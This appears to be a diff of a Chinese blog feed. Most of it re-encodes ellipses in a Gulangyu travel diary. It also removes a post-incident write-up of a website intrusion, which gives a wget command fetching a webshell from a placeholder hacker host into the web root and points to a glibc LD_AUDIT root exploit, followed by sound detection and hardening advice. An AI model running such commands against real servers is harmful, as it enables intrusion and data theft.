+<p>回到对鼓浪屿的感受上来，这是座神奇的小岛，一个在内陆生活了24年的人，一个完全对海岛没有任何想象空间的人，有一天，轮船的汽笛声，靠岸时候的响铃声，就在耳边绵绵不绝的出现，这种奇异的感觉是很难形容的，轮渡摇摇晃晃的前进，身边的人有游客，也有原住民，有的面容如我一样充满新鲜的惊奇，有的司空见惯，死一般沉默….这种古老与新鲜的气息在一艘船的缓缓驶出的时间空间里混杂，带着一种神秘的味道，靠岸了….</p>
 
-<p>第一印象：人好多，坐在靠海的石栏杆的，石凳子的，jhi一眼望去全是假山，长椅，以及卖旅游纪念品的&hellip;.和任何一个旅游之地毫无差别&hellip;</p>
+<p>第一印象：人好多，坐在靠海的石栏杆的，石凳子的，jhi一眼望去全是假山，长椅，以及卖旅游纪念品的….和任何一个旅游之地毫无差别…</p>
 
-<p>第二印象：岛的感觉，完全木有&hellip;虽然，其实我并不了解小岛应该是怎样的&hellip;</p>
+<p>第二印象：岛的感觉，完全木有…虽然，其实我并不了解小岛应该是怎样的…</p>
 
-<p>第三印象：什么张三疯奶茶，欧式的奶茶茶味盖过奶味， 完全不是我的味！还要排队购买，15块钱一杯&hellip;同志们哪&hellip;.我有种撞墙的冲动&hellip;</p>
+<p>第三印象：什么张三疯奶茶，欧式的奶茶茶味盖过奶味， 完全不是我的味！还要排队购买，15块钱一杯…同志们哪….我有种撞墙的冲动…</p>
 
-<p>这是下午的鼓浪屿&hellip;清明节节假日的鼓浪屿&hellip;</p>
+<p>这是下午的鼓浪屿…清明节节假日的鼓浪屿…</p>
 
-<p>耐心，耐心是必须的，chandlewei见状不妙，立刻开始采取积极的动作，打开GPS开始搜寻，小岛从外观上看起来很小，但是好像地图上密密麻麻看起来很繁杂很大的样子啊&hellip;</p>
+<p>耐心，耐心是必须的，chandlewei见状不妙，立刻开始采取积极的动作，打开GPS开始搜寻，小岛从外观上看起来很小，但是好像地图上密密麻麻看起来很繁杂很大的样子啊…</p>
 
 <p>需求分析：1、走遍鼓浪屿   2、吃遍鼓浪屿    3、拍遍鼓浪屿</p>
 
-<p>好吧，我是骨子里并不纯粹的恶俗文艺女青年，不过呢，我又没有文艺女青年的执着和专注，却有着市井小民的贪婪&hellip;我要看鼓浪屿的安静和古老，却也要看鼓浪屿的全部，仿佛上岛这一次，一生仅一次的感觉&hellip;这逛不全咯，逛不回本儿，这辈子都有遗憾&hellip;.</p>
+<p>好吧，我是骨子里并不纯粹的恶俗文艺女青年，不过呢，我又没有文艺女青年的执着和专注，却有着市井小民的贪婪…我要看鼓浪屿的安静和古老，却也要看鼓浪屿的全部，仿佛上岛这一次，一生仅一次的感觉…这逛不全咯，逛不回本儿，这辈子都有遗憾….</p>
 
 <p>下午四点多，上岛，晚上9点多，离开鼓浪屿。</p>
 
-<p>从人山人海的闹市开始，穿行，沙茶味儿，海鲜味儿，鱼丸味儿，腥味儿，鲜味儿，臭豆腐味儿，一古脑儿穿越过来，越走进鼓浪屿，这些味道越远，吃味渐远，建筑的风味开始显山露水，宁静一点点铺开，夜幕一点点袭来，人潮一点点褪去，剩下我和chandle自顾自的游荡，扶着砖墙，走走停停，在小巷子里恣意的谈笑。拿着相机，无人一般的凹造型。窥见一个打开的透出灯光的窗户，探头去望，眼神里光芒闪动，不料这毫无攻击的眼神却迎上了窗户里一大叔突然冒出来的恶狠狠回敬的眼神，额，房间里是有人的&hellip;我们以为自己是游客，以为有全部的权利，不想这里却是人家的私家领域，我们成了入侵者&hellip;这番经历让人久久回味 ，这里是展览的，也是生活的，这里是人工的，也是自然的，这里是喧哗的，也是专属的&hellip;对于世界来说，鼓浪屿是世界的，对于这里的居民来说，这里只是他们的家&hellip;</p>
+<p>从人山人海的闹市开始，穿行，沙茶味儿，海鲜味儿，鱼丸味儿，腥味儿，鲜味儿，臭豆腐味儿，一古脑儿穿越过来，越走进鼓浪屿，这些味道越远，吃味渐远，建筑的风味开始显山露水，宁静一点点铺开，夜幕一点点袭来，人潮一点点褪去，剩下我和chandle自顾自的游荡，扶着砖墙，走走停停，在小巷子里恣意的谈笑。拿着相机，无人一般的凹造型。窥见一个打开的透出灯光的窗户，探头去望，眼神里光芒闪动，不料这毫无攻击的眼神却迎上了窗户里一大叔突然冒出来的恶狠狠回敬的眼神，额，房间里是有人的…我们以为自己是游客，以为有全部的权利，不想这里却是人家的私家领域，我们成了入侵者…这番经历让人久久回味 ，这里是展览的，也是生活的，这里是人工的，也是自然的，这里是喧哗的，也是专属的…对于世界来说，鼓浪屿是世界的，对于这里的居民来说，这里只是他们的家…</p>
 
-<p>所以，作为游人，更是客人吧&hellip;礼貌、尊重、小心轻放的感情，切勿声张的音量&hellip;这些是我们来鼓浪屿时，就应该有的基本情绪准备&hellip;</p>
+<p>所以，作为游人，更是客人吧…礼貌、尊重、小心轻放的感情，切勿声张的音量…这些是我们来鼓浪屿时，就应该有的基本情绪准备…</p>
 
 <p>路边的小酒吧是友好的，路边的明信片小店也是温情的，花了半个小时安安静静的坐下来，脑子里临时针对那些在我生命中扮演不同角色的朋友们构思可以说的词句，一人一张明信片，一人一句话，你们收到了吗？</p>
 
-<p>路边的小排档，老板在灯光下幽幽的望着行人， 当我们驻足，她们便瞬间热情起来招呼，没有菜单，看菜点菜，哈哈，指着花蛤、鱼虾欢乐的点，在路灯下扯开一张小方桌，摆上啤酒，杯碗，热菜热饭几分钟就上来了，路灯下的我们是多么的快乐啊，一边吃一边微博，一边说话，我们永远那么多话要说，你永远在损我，我永远不给力的反抗&hellip;这是彼此的乐趣吧&hellip;2年半的我们，越来越自然的相处&hellip;彼此都有随遇而安的满足，小凳子上坐着，微凉的晚风，路边嗅嗅的小狗，这一切是自然而然的幸福感的源头&hellip;.</p>
+<p>路边的小排档，老板在灯光下幽幽的望着行人， 当我们驻足，她们便瞬间热情起来招呼，没有菜单，看菜点菜，哈哈，指着花蛤、鱼虾欢乐的点，在路灯下扯开一张小方桌，摆上啤酒，杯碗，热菜热饭几分钟就上来了，路灯下的我们是多么的快乐啊，一边吃一边微博，一边说话，我们永远那么多话要说，你永远在损我，我永远不给力的反抗…这是彼此的乐趣吧…2年半的我们，越来越自然的相处…彼此都有随遇而安的满足，小凳子上坐着，微凉的晚风，路边嗅嗅的小狗，这一切是自然而然的幸福感的源头….</p>
 
 <p>鼓浪屿的老教堂老别墅旅馆，还算有点人气，其他的老图书馆，老博物馆，都有点斑斑驳驳的锈迹了，早已无人打理，除了外观还依然留存了当年的风韵，内在大概早已摧枯拉朽，不免让人心生颓败。</p>
 
-<p>我们在鼓浪屿的腹地绕来绕去&hellip;(对于chandle来说当然不是绕啦，是清晰明了的“路线图”)，从宁静的深处回到了繁华的起点。</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[网站安全]]></title>
-    <link href="http://ChandleWEi.github.io/blog/2011/04/08/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8/"/>
-    <updated>2011-04-08T09:53:00+08:00</updated>
-    <id>http://ChandleWEi.github.io/blog/2011/04/08/网站安全</id>
-    <content type="html"><![CDATA[<p>4月1日，一个疯狂好玩的日子，本应该娱乐娱乐，同学们又在轻松迎接清明节，结果却发生了网站遭入侵事件，也算咱们运气以及人品爆发，正好有同事再进行服务器更新结果发现可疑进程，才及时避免了网站用户数据的遭窃。</p>
+<p>我们在鼓浪屿的腹地绕来绕去…(对于chandle来说当然不是绕啦，是清晰明了的“路线图”)，从宁静的深处回到了繁华的起点。</p>
 
-<p>一、入侵基本过程：</p>
-
-<p>1、利用web框架漏洞取得webshell；（至于是什么漏洞这里就不抖露。）</p>
-
-<p>2、上传后门代码方法之一：wget htt://xx.heike.com/webshell.txt;  mv webshell.txt  /wwwroot/.xx/xxx.[html/jsp/asp&hellip;.]；</p>
-
-<p>3、www调用该页面，取得服务级用户权限，并查找架构配置文件和其中的数据库用户密码；</p>
-
-<p>       网上有个现成的jsp脚本，截个图大家看看：</p>
-
-<p>      <a href="http://hiadmin.com/wp-content/uploads/2011/04/3.jpg"> <img src="http://hiadmin.com/wp-content/uploads/2011/04/3-300x106.jpg" title="3" alt="" /> </a></p>
-
-<p>      详细功能可查看： <a href="http://blog.csdn.net/kj021320/archive/2006/10/09/1327908.aspx" title="jsp管理系统">jsp管理系统</a></p>
-
-<p>4、到这里已经顺利的完成后门部署，可以执行远程普通用户shell了，后果已经相当可怕了。</p>
-
-<p>       不过这还不算完，有了普通用户的权限，离root还遥远吗？</p>
-
-<p>5、利用glibc2.X 漏洞进行提权获取root帐号；(目前测下来RH5、centos5、FC13、ubuntu10…. 都悲催的)</p>
-
-<p>       怎么操作网上一查都是,关键字就是LD_AUDIT,同学们自己试试。</p>
-
-<p>6、除了架构漏洞外，只要是被入侵后服务器，都还会留下其他多个后门隐藏在系统中、防不胜防。</p>
-
-<p>二、一些处理意见</p>
-
-<p>以下所写只是个人意见，一定也会存在不少疏忽和遗漏，只要你开启服务就必要有漏洞可以被利用。</p>
-
-<p>1、第一时间当然是断开服务，切走流量，最好是能切断网络（如果可以的话），killall可疑进程；</p>
-
-<p>2、ps -eafww中查找各个进程的父子关系，以便寻踪觅迹，找到后门代码（$0伪装进程名，这里不点透了，有经验的sa应该都知道。）</p>
-
-<p>3、找后门代码的方法很多，我自己琢磨了几个，希望对大家以后查找防范有帮助；</p>
-
-<p>       1）find /wwwroot/中的文件 按修改和创建时间查；</p>
-
-<p>       2）在所有目录中查找以被利用的服务用户为属主的文件：比如apache nobody等等；</p>
-
-<p>       3）grep -r 后门代码特征字段查找文件；</p>
-
-<p>       4） file * 查找后缀名和内容不相符的文件；</p>
-
-<p>       5）access log 可疑clientip/useragent/POST动作等等；</p>
-
-<p>       6）抛砖引玉……</p>
-
-<p>4、就算预防吧，其实只是提高入侵成本罢了；</p>
-
-<p>       1）使用ssh key登录；</p>
-
-<p>       2）限制服务器对外访问，什么要访问www？（用proxy限制访问的域名，iptables限制ip）总之开的越小越好，最好是不开。</p>
-
-<p>       3）user一律nologin；开个服务要登录shell？</p>
-
-<p>       4）卸载编译工具，好像狠了点提高了不少维护成本啦，那就改名吧。（gcc cc都改）</p>
-
-<p>       5）glibc升级，我说说而已大家自己斟酌。</p>
-
-<p>       6）熟悉selinux的 enforce起来；</p>
-
-<p>晚上辗转反侧睡不着，自己琢磨的。</p>
 ]]></content>
   </entry>
   
